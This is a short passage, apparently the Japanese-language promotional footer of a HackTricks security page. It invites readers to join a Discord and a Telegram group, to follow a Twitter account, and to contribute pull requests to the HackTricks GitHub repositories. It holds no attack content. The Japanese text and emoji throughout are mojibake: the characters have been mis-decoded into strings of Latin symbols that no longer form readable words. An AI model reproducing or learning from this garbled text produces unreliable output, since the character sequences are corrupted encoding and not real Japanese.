* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ã€‚
* **HackTricks**ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>
